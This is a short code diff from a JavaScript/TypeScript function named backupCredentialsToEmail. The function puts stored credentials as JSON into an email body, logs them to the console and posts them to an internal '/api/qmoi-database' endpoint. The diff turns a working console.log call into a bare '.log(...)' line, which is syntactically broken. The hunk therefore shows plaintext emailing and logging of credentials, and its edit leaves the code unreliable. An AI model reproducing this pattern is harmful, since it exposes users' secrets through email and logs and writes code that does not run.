@@ -88,7 +88,7 @@ async function backupCredentialsToEmail(
       body: `Platform: ${platform}\nCredentials: ${JSON.stringify(credentials, null, 2)}\nTimestamp: ${new Date().toISOString()}`,
     };
 
-    (console as any).log("Credentials backed up to email:", emailData);
+    .log("Credentials backed up to email:", emailData);
 
     // Backup to QMOI server
     await fetch("/api/qmoi-database", {
